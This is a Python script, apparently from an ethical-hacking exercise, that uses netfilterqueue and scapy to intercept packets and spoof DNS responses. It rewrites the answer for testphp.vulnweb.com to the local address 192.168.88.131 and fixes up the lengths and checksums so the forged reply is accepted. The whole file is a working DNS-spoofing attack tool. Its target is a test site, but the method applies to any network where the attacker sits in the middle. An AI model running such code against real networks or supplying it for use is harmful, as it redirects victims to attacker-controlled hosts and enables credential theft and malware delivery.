import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):  # if you look for DNS request use .DNSRQ , if it is reponse it is DNSRR
        qname = scapy_packet[scapy.DNSQR].qname #qname is byte object
        if "testphp.vulnweb.com." in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.131")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len  # len :  the length of or the size of the layer
            del scapy_packet[scapy.IP].chksum  # the checksum is used to make sure that the packet has not been modified.
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))

    # get_payload() : show actual contents inside the packet itself
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # a callback function to execute on each packet that will be trapped in this queue
# queue.bind(name of nfq , function)
queue.run()  # run queue we create
